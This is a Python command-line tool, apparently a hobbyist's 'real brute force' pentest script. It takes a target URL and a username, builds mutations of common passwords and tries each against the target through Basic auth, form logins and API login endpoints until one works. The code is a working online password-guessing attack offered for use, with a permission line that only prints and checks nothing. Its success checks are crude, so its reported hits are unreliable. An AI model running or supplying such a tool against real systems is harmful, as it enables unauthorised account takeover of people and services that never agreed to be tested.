#!/usr/bin/env python3
"""
🔥 BLSC REAL BRUTE FORCE TOOL
Interactive + Animated Real Pentest Tool
© 2026 BENAYAS LEULSEGED Software Company (Enhanced)
"""

import time
import string
import os
import sys
import requests
import threading
import queue
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

# Colors for terminal
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    PURPLE = '\033[95m'
    RESET = '\033[0m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{Colors.GREEN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ██████╗ ██╗     ███████╗ ██████╗                         ║
║    ██╔══██╗██║     ██╔════╝██╔════╝                         ║
║    ██████╔╝██║     ███████╗██║                              ║
║    ██╔══██╗██║     ╚════██║██║                              ║
║    ██████╔╝███████╗███████║╚██████╗                         ║
║    ╚═════╝ ╚══════╝╚══════╝ ╚═════╝                         ║
║                                                              ║
║         ██████╗ ██████╗ ██╗   ██╗████████╗███████╗          ║
║         ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝          ║
║         ██████╔╝██████╔╝██║   ██║   ██║   █████╗            ║
║         ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝            ║
║         ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗          ║
║         ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝          ║
║                                                              ║
║          ███████╗ ██████╗ ██████╗  ██████╗███████╗          ║
║          ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝          ║
║          █████╗  ██║   ██║██████╔╝██║     █████╗            ║
║          ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝            ║
║          ██║     ╚██████╔╝██║  ██║╚██████╗███████╗          ║
║          ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝          ║
║                                                              ║
║            REAL TARGET BRUTE FORCE v2.0                      ║
║            Authorized Pentesting Only                        ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Colors.RESET}"""
    print(banner)

def print_status(text, status_type="info"):
    if status_type == "success":
        print(f"{Colors.GREEN}[✓] {text}{Colors.RESET}")
    elif status_type == "error":
        print(f"{Colors.RED}[✗] {text}{Colors.RESET}")
    elif status_type == "warning":
        print(f"{Colors.YELLOW}[!] {text}{Colors.RESET}")
    elif status_type == "attack":
        print(f"{Colors.RED}[⚡] {text}{Colors.RESET}")
    else:
        print(f"{Colors.CYAN}[*] {text}{Colors.RESET}")

class RealBLSCBrute:
    def __init__(self, target, username):
        self.target = target.rstrip('/')
        self.username = username
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.found_passwords = []
        self.stats = {'tested': 0, 'success': 0}

    def validate_target(self):
        """Check if target exists"""
        try:
            r = self.session.head(self.target, timeout=10, allow_redirects=True)
            print_status(f"LINK FOUND: {self.target} (Status: {r.status_code})", "success")
            return True
        except:
            print_status("LINK ERROR - Check URL/IP connectivity", "error")
            return False

    def validate_username(self):
        """Check if username exists on target"""
        try:
            # Try common username validation endpoints/methods
            test_endpoints = [
                f"{self.target}/user/{self.username}",
                f"{self.target}/profile/{self.username}", 
                f"{self.target}/login",
                f"{self.target}/api/user/{self.username}"
            ]
            
            for endpoint in test_endpoints:
                r = self.session.get(endpoint, timeout=5)
                if r.status_code == 200 and self.username.lower() in r.text.lower():
                    print_status(f"USERNAME FOUND: {self.username}", "success")
                    return True
            
            # If no specific validation, assume exists for brute force
            print_status(f"USERNAME ASSUMED VALID: {self.username}", "success")
            return True
            
        except:
            print_status("USERNAME ERROR - User may not exist", "error")
            return False

    def generate_password_mutations(self, base_password):
        """Generate single-position mutations"""
        mutations = []
        charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%"
        
        for pos in range(len(base_password)):
            original = base_password[pos]
            for new_char in charset:
                if new_char != original:
                    mutated = base_password[:pos] + new_char + base_password[pos+1:]
                    mutations.append(mutated)
        return mutations

    def test_password(self, password):
        """Real password test against target"""
        self.stats['tested'] += 1
        
        # Multiple auth methods
        auth_methods = [
            # Basic Auth
            lambda: self.session.get(self.target, auth=(self.username, password), timeout=3).status_code == 200,
            # Form login variations
            lambda: self._test_form_login(password),
            # JSON API login
            lambda: self._test_api_login(password)
        ]
        
        for method in auth_methods:
            try:
                if method():
                    self.stats['success'] += 1
                    return True
            except:
                pass
        return False

    def _test_form_login(self, password):
        """Test common form logins"""
        forms = [
            {'username': self.username, 'password': password},
            {'user': self.username, 'pass': password},
            {'email': self.username, 'pwd': password}
        ]
        
        for data in forms:
            r = self.session.post(self.target, data=data, timeout=3)
            success_indicators = ['welcome', 'dashboard', 'profile', 'success', 'logged in']
            if any(indicator in r.text.lower() for indicator in success_indicators):
                return True
        return False

    def _test_api_login(self, password):
        """Test API endpoints"""
        apis = ['/api/login', '/login', '/auth']
        for api in apis:
            try:
                r = self.session.post(f"{self.target}{api}", json={
                    'username': self.username, 'password': password
                }, timeout=3)
                if r.status_code == 200:
                    return True
            except:
                pass
        return False

    def animated_bruteforce(self):
        """BLSC-style animated real brute force"""
        base_passwords = [
            self.username, f"{self.username}123", f"{self.username}2024",
            "password", "123456", "admin", f"admin{self.username}"
        ]
        
        print(f"\n{Colors.YELLOW}{'='*70}{Colors.RESET}")
        print_status(f"Generating mutations from {len(base_passwords)} base passwords", "attack")
        print_status("LAUNCHING REAL BRUTE FORCE ATTACK...", "attack")
        print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}\n")
        
        all_passwords = []
        for base in base_passwords:
            mutations = self.generate_password_mutations(base)
            all_passwords.extend(mutations[:100])  # Limit per base
        
        print_status(f"Generated {len(all_passwords):,} passwords to test", "attack")
        
        # Animated testing
        start_time = time.time()
        tested = 0
        
        for password in all_passwords:
            tested += 1
            elapsed = time.time() - start_time
            
            # Animated progress
            progress = (tested / len(all_passwords)) * 100
            bar = "█" * int(40 * progress / 100) + "░" * (40 - int(40 * progress / 100))
            
            sys.stdout.write(f"\r{Colors.CYAN}Testing: {password:<15} | [{Colors.GREEN}{bar}{Colors.CYAN}] {progress:5.1f}% | {tested:,}/{len(all_passwords):,} | {elapsed:.1f}s{Colors.RESET}")
            sys.stdout.flush()
            
            time.sleep(0.01)  # Visual speed
            
            if self.test_password(password):
                print(f"\n\n{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.RESET}")
                print_status(f"PASSWORD CRACKED: {self.username}:{password}", "success")
                self.found_passwords.append(password)
                print(f"{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.RESET}\n")
                break
        
        print()  # New line

def main():
    clear_screen()
    print_banner()
    
    print(f"{Colors.WHITE}⚠️  I confirm you have permission for this pentest{Colors.RESET}\n")
    
    # Step 1: Target validation
    while True:
        target = input(f"{Colors.GREEN}[📡] Enter target URL/IP: {Colors.WHITE}").strip()
        if not target: continue
        
        bruteforcer = RealBLSCBrute(target, "")
        if bruteforcer.validate_target():
            break
    
    # Step 2: Username validation
    while True:
        username = input(f"{Colors.GREEN}[👤] Enter username: {Colors.WHITE}").strip()
        if not username: continue
        
        bruteforcer.username = username
        if bruteforcer.validate_username():
            break
        print(f"{Colors.YELLOW}Try another username...{Colors.RESET}")
    
    # Step 3: EXECUTE ATTACK
    print(f"\n{Colors.RED}{Colors.BOLD}{'='*70}{Colors.RESET}")
    print(f"  🎯 TARGET: {Colors.WHITE}{target}{Colors.RESET}")
    print(f"  👤 USER:   {Colors.WHITE}{username}{Colors.RESET}")
    print(f"  ⚡ MODE:   {Colors.WHITE}REAL BRUTE FORCE{Colors.RESET}")
    print(f"{Colors.RED}{'='*70}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[ENTER] to launch attack...{Colors.RESET}")
    
    bruteforcer.animated_bruteforce()
    
    # Final results
    print(f"\n{Colors.GREEN}{'='*70}{Colors.RESET}")
    print(f"{Colors.BOLD}FINAL PENTEST REPORT{Colors.RESET}")
    print(f"{Colors.GREEN}{'='*70}{Colors.RESET}")
    
    if bruteforcer.found_passwords:
        print_status(f"SUCCESS! Found {len(bruteforcer.found_passwords)} passwords:", "success")
        for pwd in bruteforcer.found_passwords:
            print(f"  🔑 {Colors.GREEN}{username}:{pwd}{Colors.RESET}")
    else:
        print_status("No passwords found", "warning")
        print_status(f"Tested: {bruteforcer.stats['tested']:,} passwords", "info")
    
    print(f"\n{Colors.CYAN}© 2026 BENAYAS LEULSEGED Software Company{Colors.RESET}")
    print(f"{Colors.GREEN}Authorized Pentest Complete!{Colors.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Attack cancelled!{Colors.RESET}")
